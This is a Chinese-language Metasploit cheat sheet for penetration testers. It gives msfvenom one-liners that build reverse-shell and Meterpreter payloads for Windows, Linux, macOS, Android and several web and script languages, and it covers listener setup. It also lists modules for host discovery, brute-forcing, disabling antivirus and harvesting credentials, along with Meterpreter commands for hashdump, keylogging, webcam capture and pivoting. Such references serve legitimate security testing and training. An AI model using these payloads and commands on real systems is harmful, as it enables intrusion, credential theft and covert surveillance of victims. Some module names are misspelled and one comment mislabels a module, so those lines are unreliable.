### MSF监听


#### 模块路径

```
use exploit/multi/handler
```


#### 设置参数

```
show options
set LHOST <监听IP>
set LPORT <端口>
run
```

### MSFvenom

#### 参数介绍
```
-l, --list <type> 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,......all 
-p, --payload < payload> 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的 
-f, --format < format> 指定输出格式 
-e, --encoder <encoder> 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload 
-a, --arch < architecture> 指定payload的目标架构，例如x86 还是 x64 还是 x86_64 -o, --out < path> 指定创建好的payload的存放位置 
-b, --bad-chars < list> 设定规避字符集，指定需要过滤的坏字符。例如：不使用 '\x0f'、'\x00' 
-n, --nopsled < length> 为payload预先指定一个NOP滑动长度 -s, --space < length> 设定有效攻击荷载的最大长度，就是文件大小 
-i, --iterations < count> 指定payload的编码次数 -c, --add-code < path> 指定一个附加的win32 shellcode文件 
-x, --template < path> 指定一个自定义的可执行文件作为模板,并将payload嵌入其中
-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行
-v, --var-name < value> 指定一个自定义的变量，以确定输出格式
-t, --timeout <second> 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用）
-h,--help 查看帮助选项
--platform < platform> 指定payload的目标平台
```

#### 生成木马

##### Windows 64位

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=7777 -f exe > shell.exe
```

##### Windows 32位

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=5555 -a x86 --platform Windows -f exe > shell.exe
```

##### Linux 64位

```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf > shell.elf
```

##### Linux 32位

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.0.125 LPORT=5551 -a x86 --platform Linux -f elf > shell.elf
```

##### Mac OS 64位

```
msfvenom -a x64 --platform osx -p osx/x64/shell_reverse_tcp LHOST=x.x.x.x
LPORT=2333 -f macho -o payload.macho
```

##### Mac OS 32位

```
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=x.x.x.x
LPORT=2333 -f macho -o payload.macho
```

##### Android

```
msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f raw > shell.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 R > test.apk
```

##### Powershell

```
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=x.x.x.x LPORT=2333 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1
```

##### NC

```
正向 msfvenom -p windows/shell_hidden_bind_tcp LHOST=x.x.x.x LPORT=2333 -f exe> 1.exe
反向 msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=7777 -f exe> 1.exe
```

##### Python

```
msfvenom -p cmd/unix/reverse_python LHOST=x.x.x.x LPORT=2333 -f raw > shell.py
```

##### PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=2333 -f raw > shell.php
```

##### ASP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f asp > shell.asp
```

##### ASP.net

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f aspx > shell.aspx
```

##### JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=2333 -f raw > shell.jsp
```

##### Perl

```
msfvenom -p cmd/unix/reverse_perl LHOST=x.x.x.x LPORT=2333 -f raw > shell.pl
```

##### Lua

```
msfvenom -p cmd/unix/reverse_lua LHOST=x.x.x.x LPORT=2333 -f raw -o payload.lua
```

##### Ruby

```
msfvenom -p ruby/shell_reverse_tcp LHOST=x.x.x.x LPORT=2333 -f raw -o payload.rb
```

##### Node.js

```
msfvenom -p nodejs/shell_reverse_tcp LHOST=x.x.x.x LPORT=2333 -f raw -o payload.js
```

##### Bash

```
msfvenom -p cmd/unix/reverse_bash LHOST=x.x.x.x LPORT=2333 -f raw > shell.sh
```

##### Raw 64位

```
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f raw -o 1.bin
```

##### Raw 32位

```
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f raw -o 1.bin
```

### MSF模块

#### 辅助模块 (Auxiliary)

##### 内网存活主机扫描

```
use auxiliary/scanner/discovery/arp_sweep
use auxiliary/scanner/discovery/udp_sweep
use auxiliary/scanner/discovery/udp_probe
use auxiliary/scanner/netbios/nbname
use auxiliary/scanner/http/title
use auxiliary/scanner/ftp/anonymou
use auxiliary/scanner/dns/dns_amp
```

##### 域中存活主机扫描

```
use windows/gather/enum_ad_computers
use windows/gather/enum_computers
use windows/gather/enum_domain
use windows/gather/enum_domains
use windows/gather/enum_ad_user_comments
```

##### 端口扫描

```
use auxiliary/scanner/portmap/portmap_amp
use auxiliary/scanner/portscan/ftpbounce
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/portscan/ack
use auxiliary/scanner/portscan/syn
use auxiliary/scanner/portscan/xmas
```

##### 服务扫描

```
use auxiliary/scanner/mysql/mysql_version        #扫描MySQL服务
use auxiliary/scanner/telnet/telnet_version      #扫描Telnet服务
use auxiliary/scanner/ftp/ftp_version            #扫描FTP服务
use auxiliary/scanner/http/http_version          #扫描HTTP服务
use auxiliary/scanner/ssh/ssh_version            #扫描SSH服务
use auxiliary/scanner/smb/smb_version	         #扫描SMB服务

use auxiliary/scanner/ssh/ssh_login		         #SSH爆破
use auxiliary/scanner/vnc/vnc_none_auth	         #VNC空口令扫描
use auxiliary/scanner/telnet/telnet_login        #SSH爆破
use auxiliary/scanner/smb/smb_enumusers	         #SMB枚举
use auxiliary/scanner/smb/smb_login		         #SMB弱口令登录
use auxiliary/admin/smb/psexec_command	         #登录SMB且执行命令

use auxiliary/scanner/mssql/mssql_ping	         #MSSQL主机信息扫描
use auxiliary/admin/mssql/mssql_enum	         #MSSQL枚举
use auxiliary/scanner/mysql/mysql_login	         #MySQL弱口令扫描
use auxiliary/admin/mysql/mysql_enum	         #MySQL枚举
```

#### 攻击模块 (Exploit)

```
search xxx     #搜索某个漏洞
use xxx        #使用某个漏洞利用模块
show options   #查看配置选项
set payload    #配置攻击载荷
exploit        #执行攻击
```

#### 后渗透模块 (Post)

```
run post/multi/recon/local_exploit_suggester       #列举可用EXP
run post/windows/gather/enum_patches               #发现补丁
run post/windows/gather/checkvm		               #检查目标是否虚拟机
run post/linux/gather/checkvm
run post/windows/manage/killav		               #关闭杀软
run post/windows/manage/enable_rdp	               #开启目标远程桌面
run post/windows/gather/enum_logged_on_users	   #列举当前登陆用户，和最近登陆过的用户
run post/windows/gather/enum_applications		   #列举应用程序
run windows/gather/credentials/windows_autologin   #列举自动登陆的用户名和密码
```

### Meterpreter

#### 命令摘要

```
cd           #切换到指定目录
pwd          #获取所在目录的绝对路径
ls           #查看当前目录
getuid       #查看当前权限
getsystem    #获得系统管理员权限 (需要本地管理员权限运行)
hashdump     #抓取Hash
sysinfo      #查看系统信息
idletim      #查看目标系统已运行时间
route        #查看目标机器完整网络设置
shell        #进入目标机器shell，exit退出shell
background   #将Meterpreter隐藏在后台

upload <本地路径> <远程路径>      #上传文件
download <远程路径> <本地路径>    #下载文件
search -f *.txt -d C://          #搜索文件

keyscan_start	#启动键盘记录
keyscan_stop	#停止键盘记录
keyscan_dump	#转储键盘记录的内容
screenshot		#抓取截屏
webcam_list		#摄像头列表
webcam_snap		#摄像头拍照
webcam_stream	#抓取视频
```

#### 持久化

```
getpid			#查看当前Meterpreter Shell的进程号
ps				#获取目标机正运行的进程
migrate 786		#将shell迁移到PID为786的进程中
```

### MSF路由设置


#### 获取目标内网相关信息

```
run get_loacal_subnets
```


#### 添加自动路由

```
run post/multi/manage/auoroute
```


#### 配置静态路由

```
run autoroute -s 0.0.0.0/24
```


#### 查看路由表

```
run autoroute -p
```


#### 添加路由

```
route 0.0.0.0 255.255.255.0 1
```


#### 清空路由

```
route flush
```


### MSF代理设置


#### 模块路径

```
use auxiliary/server/socks5
```


#### 设置参数

```
show options
set SRVHOST <IP>
set SRVPORT <端口>
run
```

